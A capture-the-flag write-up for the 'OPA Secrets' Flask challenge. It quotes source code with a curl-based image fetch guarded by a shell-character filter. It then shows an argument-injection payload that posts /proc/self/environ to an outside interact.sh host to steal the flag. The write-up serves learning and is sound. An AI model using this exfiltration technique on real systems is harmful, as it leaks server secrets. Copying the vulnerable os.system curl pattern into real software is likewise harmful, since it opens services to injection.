# OPA Secrets

The application source code was provided : https://github.com/congon4tor/opa_secrets

It's a flask application, the challenge descriptions says: *OPA! Check out our new secret management service* 

After signing up , we can add a secret by clicking on the `Create secret` button
![firefox_7rJil9jpkB](https://user-images.githubusercontent.com/31372554/133927976-ee43e760-73bc-44e1-abd0-2d3e151efcd8.png)

There are three more users on the application , which we can find from the app.py file. :

```python3
    u = [
        {
            "id": "1822f21a-d720-4494-a31f-943bec140789",
            "username": "congon4tor",
            "role": "admin",
            "password": os.getenv("AMDIN_PASSWORD", "qwerty123"),
        },
        {
            "id": "243eae36-621a-47a6-b306-841bbffbcac4",
            "username": "jellytalk",
            "role": "user",
            "password": "test",
        },
        {
            "id": "9d6492e1-c73d-4231-add7-7ea285fc98a1",
            "username": "pinkykoala",
            "role": "user",
            "password": "test",
        },
    ]
```
The `congon4tor` user has the flag stored as a secret in his acc.

On the profile settings page, http://challenge.ctf.games:30114/settings  it says *We will fetch the image from the provided URL* .


![firefox_xIEQUVNsPY](https://user-images.githubusercontent.com/31372554/133928080-c29fb7fa-0055-4a56-a64c-eb0c6bb6c7ca.png)



https://interact.projectdiscovery.io/#/

![chrome_EAOaKB80vA](https://user-images.githubusercontent.com/31372554/133928205-25849f2c-885c-44e8-94ca-daadf618d6d2.png)

You can notice the user agent it's curl, let's look more into the source code:

```python3
@app.route("/updateSettings", methods=["POST"])
def updateSettings():

    url = request.form.get("url")
    if not url:
        return redirect("settings?error=Missing parameters")

    if not session.get("id", None):
        return redirect("/signin?error=Please sign in")
    user_id = session.get("id")
    user = get_user(user_id)
    if not user:
        return redirect("/signin?error=Invalid session")

    if (
        ";" in url
        or "`" in url
        or "$" in url
        or "(" in url
        or "|" in url
        or "&" in url
        or "<" in url
        or ">" in url
    ):
        return redirect("settings?error=Invalid character")

    cmd = f"curl --request GET {url} --output ./static/images/{user['id']} --proto =http,https"
    status = os.system(cmd)
    if status != 0:
        return redirect("settings?error=Error fetching the image")

    user["picture"] = user_id

    return redirect("settings?success=Successfully updated the profile picture")
```

The above code checks for special characters in the url to avoid command injection but not from *argument Injection*. We can add our own argument to the curl command like change the request method, send post data,etc.

The flag is stored in the env variable.
```
    s = [
        {
            "id": "afce78a8-23d6-4f07-81f2-47c96ddb10cf",
            "name": "Flag",
            "value": os.getenv("FLAG", "TEST_FLAG"),
        },
        {
            "id": "d2e0704c-55a5-4a63-aad5-849798283da5",
            "name": "Test 1",
            "value": "test secret",
        },
        {
            "id": "491e16d2-fd2b-4965-bcb6-5931ef61ed5b",
            "name": "Test 2",
            "value": "test secret 2",
        },
    ]
```

By adding an arguement like `-d @/proc/self/environ` this will send the content of the file `/proc/self/environ` to out controlled server.
![firefox_HZRIprVDFW](https://user-images.githubusercontent.com/31372554/133928548-8acbe206-0fd3-48e8-b3f6-ef3e321d91af.png)

`https://x.interact.sh  -X POST -d @/proc/self/environ`

![image](https://user-images.githubusercontent.com/31372554/133928677-81176d44-2ba9-4e7d-9d9c-02fddd832de0.png)

After the ctf was over found that this was an unintended way, if you try to reproduce the same now it won't



